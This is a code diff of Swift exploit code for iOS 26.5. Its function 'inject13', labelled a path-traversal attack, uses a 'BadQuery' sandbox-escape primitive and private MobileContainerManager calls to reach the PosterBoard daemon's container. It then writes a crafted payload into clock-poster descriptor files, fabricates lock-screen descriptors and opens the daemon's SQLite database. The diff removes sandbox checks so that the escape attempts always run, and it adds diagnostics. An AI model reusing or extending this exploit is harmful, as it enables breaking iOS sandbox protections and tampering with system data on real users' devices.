@@ -3776,7 +3776,7 @@ class SymHandler {
 
     @discardableResult
     static func inject13() -> String {
-        var diag = ["=== Inject v13-r12 (PRPosterCustomTimeFontConfiguration path-traversal) \(Date()) iOS 26.5 ==="]
+        var diag = ["=== Inject v13-r13 (PRPosterCustomTimeFontConfiguration path-traversal) \(Date()) iOS 26.5 ==="]
         let fm = FileManager.default
 
         for fw in ["/System/Library/PrivateFrameworks/PosterKit.framework/PosterKit",
@@ -3840,6 +3840,43 @@ class SymHandler {
         if !containerFound {
             diag.append("WARNING: could not confirm container root — using Application fallback")
         }
+
+        // POSIX ownership diagnostic: uid/gid/mode reveals why Library/ can't be listed.
+        // mode 0o711 (rwx--x--x) = execute-only for others → stat works, readdir fails.
+        var stCont = stat(); var stLib = stat()
+        container.withCString { _ = lstat($0, &stCont) }
+        (container + "/Library").withCString { _ = lstat($0, &stLib) }
+        diag.append("our uid=\(getuid())")
+        diag.append("container stat: uid=\(stCont.st_uid) gid=\(stCont.st_gid) mode=0o\(String(stCont.st_mode & 0o7777, radix: 8))")
+        diag.append("Library/ stat: uid=\(stLib.st_uid) gid=\(stLib.st_gid) mode=0o\(String(stLib.st_mode & 0o7777, radix: 8))")
+
+        // MCMAppDataContainer: ask containermanagerd directly for posterboardd's container.
+        // Requires platform-application entitlement. Replaces the wrong UUID from bad_query scan.
+        dlopen("/System/Library/PrivateFrameworks/MobileContainerManager.framework/MobileContainerManager", RTLD_NOW | RTLD_GLOBAL)
+        if let mcmCls = NSClassFromString("MCMAppDataContainer") {
+            let mcmSel = NSSelectorFromString("containerWithIdentifier:createIfNecessary:existed:error:")
+            if let mcmMethod = class_getClassMethod(mcmCls, mcmSel) {
+                typealias MCMFn = @convention(c) (AnyObject, Selector, NSString, Bool,
+                                                  UnsafeMutablePointer<ObjCBool>?,
+                                                  UnsafeMutablePointer<NSError?>?) -> AnyObject?
+                let mcmFn = unsafeBitCast(method_getImplementation(mcmMethod), to: MCMFn.self)
+                if let res = mcmFn(mcmCls, mcmSel, "com.apple.PosterBoard" as NSString, false, nil, nil) {
+                    if let url = res.value(forKey: "url") as? URL {
+                        diag.append("MCM: posterboardd container = \(url.path)")
+                        container = url.path
+                    } else {
+                        diag.append("MCM: got result but no .url key — \(type(of: res))")
+                    }
+                } else {
+                    diag.append("MCM: nil result (containermanagerd rejected; platform-application may be absent)")
+                }
+            } else {
+                diag.append("MCM: method not found on MCMAppDataContainer")
+            }
+        } else {
+            diag.append("MCM: MCMAppDataContainer class not found")
+        }
+        diag.append("effective container: \(container)")
 
         let cacheDir = container + "/Library/Caches"
         let fontFileName = "pp_probe_font13.otf"
@@ -3934,6 +3971,30 @@ class SymHandler {
         var clockExtBase = extBase
         var discoveredClockExt: String? = allExts.first(where: { $0.contains("ClockPoster") })
 
+        // If listing failed (POSIX read-permission denied on Extensions/), probe known names
+        // directly via fm.fileExists — which only needs execute bit, not read bit.
+        if discoveredClockExt == nil {
+            let knownClockNames = [
+                "com.apple.ClockPoster.ClockPosterExtension.appex",
+                "com.apple.posterkit.clockface.ClockPosterExtension.appex",
+                "com.apple.ClockPoster.appex",
+                "ClockPosterExtension.appex"
+            ]
+            for name in knownClockNames {
+                if fm.fileExists(atPath: "\(extBase)/\(name)") {
+                    discoveredClockExt = name
+                    diag.append("clockExt: found by known name: \(name)")
+                    break
+                }
+            }
+            if discoveredClockExt == nil {
+                diag.append("clockExt: known names not found under extBase — probing known names logged above")
+                for name in knownClockNames {
+                    diag.append("  checked: \(extBase)/\(name)")
+                }
+            }
+        }
+
         if discoveredClockExt == nil {
             diag.append("ClockPoster absent — scanning containers + fixed paths")
             // Include AppGroup: posterboardd may share data via a group container on iOS 26
@@ -3946,8 +4007,7 @@ class SymHandler {
             // Note: fm.contentsOfDirectory can't list container roots (POSIX read
             // permission restricted) but bad_query consume may open that gate.
             outer: for root in scanRoots {
-                // Try bad_query consume on the root itself so readdir can proceed
-                let rootH = noSandbox ? (try? BadQuery.consume(path: root, create: false)) : nil
+                let rootH = try? BadQuery.consume(path: root, create: false)
                 let uuids = (try? fm.contentsOfDirectory(atPath: root)) ?? []
                 rootH?.release()
                 diag.append("  \(root.components(separatedBy: "/").last ?? root): \(uuids.filter { $0.count == 36 }.count) UUIDs")
@@ -4011,10 +4071,11 @@ class SymHandler {
 
         // iOS 26 uses "descriptors/" -- prior iOS used "configurations"/"staticdescriptors"
         let descriptorsPath = "\(clockExtBase)/\(clockExtName)/descriptors"
-        let descH: BadQueryHandle? = noSandbox ? nil : (try? BadQuery.consume(path: descriptorsPath, create: false))
+        let descH = try? BadQuery.consume(path: descriptorsPath, create: false)
         defer { descH?.release() }
-        guard noSandbox || descH != nil else {
-            diag.append("ClockPoster descriptors/ NOACCESS"); return pbSave(diag)
+        diag.append("descriptors bq=\(descH != nil) noSandbox=\(noSandbox)")
+        guard fm.fileExists(atPath: descriptorsPath) || descH != nil else {
+            diag.append("ClockPoster descriptors/ not found"); return pbSave(diag)
         }
 
         let allUUIDs = ((try? fm.contentsOfDirectory(atPath: descriptorsPath)) ?? [])
@@ -4028,7 +4089,7 @@ class SymHandler {
             let cfgPath = "\(descriptorsPath)/\(cfg)"
 
             let rolePath = "\(cfgPath)/com.apple.posterkit.role.identifier"
-            if !noSandbox { (try? BadQuery.consume(path: rolePath, create: false))?.release() }
+            (try? BadQuery.consume(path: rolePath, create: false))?.release()
             let role = (try? String(contentsOfFile: rolePath, encoding: .utf8))?
                 .trimmingCharacters(in: .whitespacesAndNewlines) ?? "?"
             let isLS = role.contains("LockScreen")
@@ -4036,18 +4097,17 @@ class SymHandler {
             if isLS && firstLockScreenUUID == nil { firstLockScreenUUID = cfg }
 
             let versPath = "\(cfgPath)/versions"
-            let versH: BadQueryHandle? = noSandbox ? nil : (try? BadQuery.consume(path: versPath, create: false))
-            guard noSandbox || versH != nil else {
-                versH?.release()
-                diag.append("  \(cfg.prefix(8)) versions NOACCESS"); continue
-            }
+            let versH = try? BadQuery.consume(path: versPath, create: false)
             var vers = ((try? fm.contentsOfDirectory(atPath: versPath)) ?? []).filter { !$0.hasPrefix(".") }
             versH?.release()
+            diag.append("  \(cfg.prefix(8)) versions: \(vers.count) bq=\(versH != nil)")
 
             // iOS 26 versions/ is empty for existing ClockPoster descriptors -- create "1"
             if vers.isEmpty {
                 let ver1 = "\(versPath)/1"
-                let v1OK = noSandbox || (try? BadQuery.consume(path: ver1, create: true)) != nil
+                let v1BQ = try? BadQuery.consume(path: ver1, create: true)
+                let v1OK = v1BQ != nil || noSandbox
+                v1BQ?.release()
                 if v1OK {
                     try? fm.createDirectory(atPath: ver1, withIntermediateDirectories: true, attributes: nil)
                     if fm.fileExists(atPath: ver1) {
@@ -4059,14 +4119,15 @@ class SymHandler {
 
             for ver in vers where !ver.hasPrefix(".") {
                 let vPath = "\(versPath)/\(ver)"
-                let vH: BadQueryHandle? = noSandbox ? nil : (try? BadQuery.consume(path: vPath, create: false))
-                guard noSandbox || vH != nil else { vH?.release(); continue }
+                let vH = try? BadQuery.consume(path: vPath, create: false)
+                let vHOK = vH != nil || noSandbox
+                if !vHOK { vH?.release(); continue }
 
                 for contentSubdir in ["", "contents"] {
                     let base = contentSubdir.isEmpty ? vPath : "\(vPath)/\(contentSubdir)"
                     if !contentSubdir.isEmpty {
-                        let cH: BadQueryHandle? = noSandbox ? nil : (try? BadQuery.consume(path: base, create: false))
-                        guard noSandbox || cH != nil else { cH?.release(); continue }
+                        let cH = try? BadQuery.consume(path: base, create: false)
+                        guard cH != nil || noSandbox else { cH?.release(); continue }
                         cH?.release()
                     }
                     let dirLabel = contentSubdir.isEmpty ? "vDir" : "contents"
@@ -4075,10 +4136,11 @@ class SymHandler {
                         diag.append("  existing(\(existing.count)b):")
                         p7DumpNSKAKeys(data: existing, indent: "    ", diag: &diag)
                     }
-                    if !noSandbox { (try? BadQuery.consume(path: titlePath, create: true))?.release() }
+                    let wBQ = try? BadQuery.consume(path: titlePath, create: true)
+                    wBQ?.release()
                     let ok = fm.createFile(atPath: titlePath, contents: payload13sys, attributes: nil)
                         || ((try? payload13sys.write(to: URL(fileURLWithPath: titlePath))) != nil)
-                    diag.append("\(cfg.prefix(8))/v\(ver)/\(dirLabel)/titleStyle: \(ok ? "WRITTEN" : "FAIL")")
+                    diag.append("\(cfg.prefix(8))/v\(ver)/\(dirLabel)/titleStyle: \(ok ? "WRITTEN" : "FAIL") bq=\(wBQ != nil)")
                     if ok { totalWritten += 1 }
                 }
                 vH?.release()
@@ -4088,33 +4150,37 @@ class SymHandler {
         // If all existing descriptors are PRPosterRoleAmbient (Astronomy AOD only),
         // synthesize a minimal PRPosterRoleLockScreen descriptor from scratch.
         if firstLockScreenUUID == nil {
-            diag.append("All descriptors are Ambient -- synthesizing PRPosterRoleLockScreen")
+            diag.append("No LockScreen descriptor found — synthesizing PRPosterRoleLockScreen")
             let newUUID = UUID().uuidString
             let newPath = "\(descriptorsPath)/\(newUUID)"
-            let nOK = noSandbox || (try? BadQuery.consume(path: newPath, create: true)) != nil
+            let nBQ = try? BadQuery.consume(path: newPath, create: true)
+            let nOK = nBQ != nil || noSandbox
+            nBQ?.release()
+            diag.append("synthesize descriptor bq=\(nBQ != nil) nOK=\(nOK)")
             if nOK {
                 try? fm.createDirectory(atPath: newPath, withIntermediateDirectories: true, attributes: nil)
                 let roleFile = "\(newPath)/com.apple.posterkit.role.identifier"
-                if !noSandbox { (try? BadQuery.consume(path: roleFile, create: true))?.release() }
+                (try? BadQuery.consume(path: roleFile, create: true))?.release()
                 fm.createFile(atPath: roleFile,
                               contents: "PRPosterRoleLockScreen".data(using: .utf8), attributes: nil)
                 let idFile = "\(newPath)/com.apple.posterkit.provider.descriptor.identifier"
-                if !noSandbox { (try? BadQuery.consume(path: idFile, create: true))?.release() }
+                (try? BadQuery.consume(path: idFile, create: true))?.release()
                 fm.createFile(atPath: idFile,
                               contents: "pp-inject13-ls".data(using: .utf8), attributes: nil)
                 let provFile = "\(newPath)/providerInfo.plist"
-                if !noSandbox { (try? BadQuery.consume(path: provFile, create: true))?.release() }
+                (try? BadQuery.consume(path: provFile, create: true))?.release()
                 if let provData = try? NSKeyedArchiver.archivedData(
                     withRootObject: NSDictionary(), requiringSecureCoding: false) {
                     fm.createFile(atPath: provFile, contents: provData, attributes: nil)
                 }
                 let ver1 = "\(newPath)/versions/1"
-                if !noSandbox { (try? BadQuery.consume(path: ver1, create: true))?.release() }
+                (try? BadQuery.consume(path: ver1, create: true))?.release()
                 try? fm.createDirectory(atPath: ver1, withIntermediateDirectories: true, attributes: nil)
                 let titlePath = "\(ver1)/com.apple.posterkit.provider.instance.titleStyleConfiguration.plist"
-                if !noSandbox { (try? BadQuery.consume(path: titlePath, create: true))?.release() }
+                let tBQ = try? BadQuery.consume(path: titlePath, create: true)
+                tBQ?.release()
                 let ok = fm.createFile(atPath: titlePath, contents: payload13sys, attributes: nil)
-                diag.append("synthesized \(newUUID.prefix(8)) titleStyle: \(ok ? "WRITTEN" : "FAIL")")
+                diag.append("synthesized \(newUUID.prefix(8)) titleStyle: \(ok ? "WRITTEN" : "FAIL") bq=\(tBQ != nil)")
                 if ok { totalWritten += 1; firstLockScreenUUID = newUUID }
             }
         }
@@ -4124,7 +4190,9 @@ class SymHandler {
         if let clockUUID = firstLockScreenUUID {
             let dbPath = container
                 + "/Library/Application Support/PRBPosterExtensionDataStore/PBFPosterExtensionDataStoreSQLiteDatabase.sqlite3"
-            let dbOK = noSandbox || (try? BadQuery.consume(path: dbPath, create: false)) != nil
+            let dbBQ = try? BadQuery.consume(path: dbPath, create: false)
+            let dbOK = dbBQ != nil || noSandbox
+            dbBQ?.release()
             if dbOK {
                 var db: OpaquePointer?
                 if sqlite3_open(dbPath, &db) == SQLITE_OK {
